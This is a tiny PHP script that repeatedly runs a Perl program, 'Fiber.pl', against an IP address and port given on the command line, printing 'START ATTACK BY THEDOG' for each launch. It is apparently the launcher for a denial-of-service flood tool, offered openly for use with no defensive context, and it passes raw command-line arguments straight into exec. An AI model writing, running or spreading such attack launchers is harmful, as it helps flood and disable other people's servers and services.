<?php
for ($x = 0; $x <= $argv[3]; $x++) {
	$rand = rand(0,0);
	exec('/root/perl Fiber.pl '.$argv[1].' '.$argv[2].' 0 '.$rand.' ');
	echo "START ATTACK BY THEDOG IP ".$argv[1].":".$argv[2]." TIME $x THREADS = $rand\n";
}
?>
